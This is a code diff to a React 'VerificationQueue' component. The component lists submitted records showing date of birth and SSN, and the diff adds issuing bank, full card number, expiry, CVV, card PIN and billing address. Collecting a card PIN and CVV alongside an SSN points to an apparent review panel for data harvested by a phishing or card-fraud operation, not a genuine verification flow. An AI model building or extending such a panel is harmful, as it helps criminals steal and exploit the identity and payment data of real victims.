@@ -1,4 +1,5 @@
 
+
 import React, { useState, useEffect, useCallback } from 'react';
 import { Verification } from '../../types';
 
@@ -71,9 +72,23 @@ const VerificationQueue: React.FC = () => {
                             <p><strong>DOB:</strong> {v.data.dob}</p>
                             <p><strong>SSN:</strong> {v.data.ssn}</p>
                             <hr className="my-2"/>
-                            <p><strong>Cardholder:</strong> {v.data.cardName}</p>
-                            <p><strong>Card Number:</strong> {v.data.cardNumber}</p>
-                             <p><strong>Card PIN:</strong> {v.data.cardPin}</p>
+                            <p className="font-semibold">Card Details</p>
+                            <div className="grid grid-cols-2 gap-x-4 gap-y-1">
+                                <span><strong>Cardholder:</strong> {v.data.cardName}</span>
+                                <span><strong>Issuing Bank:</strong> {v.data.cardBank}</span>
+                                <span><strong>Card Number:</strong> {v.data.cardNumber}</span>
+                                <span><strong>Card Type:</strong> <span className="capitalize">{v.data.cardType}</span></span>
+                                <span><strong>Expiry:</strong> {v.data.cardExpiry}</span>
+                                <span><strong>CVV:</strong> {v.data.cardCvv}</span>
+                                <span><strong>PIN:</strong> {v.data.cardPin}</span>
+                            </div>
+                            <hr className="my-2"/>
+                            <p className="font-semibold">Billing Address</p>
+                            {v.data.billingSameAsHome ? (
+                                <p className="text-gray-600 italic">Same as home address.</p>
+                            ) : (
+                                <p className="text-gray-800">{`${v.data.billingAddressLine1}, ${v.data.billingCity}, ${v.data.billingState} ${v.data.billingZipCode}`}</p>
+                            )}
                             <hr className="my-2"/>
                             <div className="grid grid-cols-2 gap-4">
                                 <div>
